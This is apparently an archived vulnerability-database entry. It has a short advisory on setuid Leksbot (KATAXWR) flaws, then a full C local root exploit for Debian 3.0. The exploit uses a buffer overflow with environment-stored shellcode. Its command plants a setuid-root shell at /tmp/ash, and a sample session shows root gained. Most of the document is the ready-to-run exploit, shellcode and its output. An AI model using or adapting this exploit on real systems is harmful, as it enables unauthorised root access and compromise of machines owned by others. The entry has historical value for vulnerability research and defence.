source: http://www.securityfocus.com/bid/7505/info

Multiple vulnerabilities have been reported for Leksbot. The precise nature of these vulnerabilities are currently unknown however, exploitation of this issue may result in an attacker obtaining elevated privileges. This is because in some installations, the Leksbot binary may be installed setuid.

/* by gunzip 
 * KATAXWR/leksbot local root exploit
 * for Debian Linux 3.0
 * http://www.securityfocus.com/bid/7505
 * change command if you don't like it (gives a root shell in /tmp/ash)
 * http://members.xoom.it/gunzip . more to come
*/
#define COMMAND "cp /bin/ash /tmp && chmod 4755 /tmp/ash"
#define PATH	"/usr/bin/KATAXWR"
#define ADDR	512
#define SIZE	4096
#define OFFSET	2700

char shellcode[] = /* taken from lsd-pl */
    "\xeb\x22"             /* jmp     <cmdshellcode+36>      */
    "\x59"                 /* popl    %ecx                   */
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x66\x68""-c"         /* pushw   $0x632d                */
    "\x89\xe7"             /* movl    %esp,%edi              */
    "\x50"                 /* pushl   %eax                   */
    "\x51"                 /* pushl   %ecx                   */
    "\x57"                 /* pushl   %edi                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdql                           */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
    "\xe8\xd9\xff\xff\xff" /* call    <cmdshellcode+2>       */
    COMMAND;

static char cmd[SIZE];

main(int argc, char *argv[])
{
	char buf[ADDR];
	char egg[SIZE];
	int i, offset ;
	unsigned long ret ;
	unsigned long sp = (unsigned long) &sp ;
	printf("Local (possibly) root exploit for /usr/bin/KATAXWR (leksbot)\n"
	       "tested on Debian 3.0 - usage: ./ex [offset] - by gunzip\n");	
	if ( argv[1] ) offset = atoi( argv[1] ); else offset = OFFSET ; 
	ret = sp + offset ;
	memset( cmd, 0x00, SIZE );
	memset( buf, 0x00, ADDR );
	memset( egg, 0x41, SIZE );
	memcpy( &egg[ SIZE - strlen( shellcode ) - 1 ], shellcode, strlen( shellcode ));
	memcpy( egg, "EGG=", 4 );
	egg[ SIZE - 1 ] = 0 ;
	putenv( egg );
 	for ( i=0; i < ADDR ; i += 4 ) *( unsigned long *)&buf[ i ] = ret;
	*( unsigned long *)&buf[ ADDR - 4 ] =  0x00000000 ; /*  :-?  */
	if (!(ret&0xff)||!(ret&0xff00)||!(ret&0xff0000)||!(ret&0xff000000)) {
		printf("Return address contains null byte(s), change offset and retry.\n");
		exit( -1 );
	}
	printf( "retaddr=0x%.08x offset=%d len=%d\n", (unsigned int)ret, offset, strlen( buf ));
	snprintf ( cmd, SIZE - 4, " echo '%s' | %s", buf, PATH );
	system( cmd );
}
/*
 bash-2.05b$ ./a.out
 retaddr=0xbffff668 offset=2700 len=508
 Please insert the term
 #dwsete tin simasia__#
 Do you want to add an other term?(y-n)
 bash-2.05b$ /tmp/ash
 # id
 uid=1002(test) gid=1002(test) euid=0(root) groups=1002(test)
*/
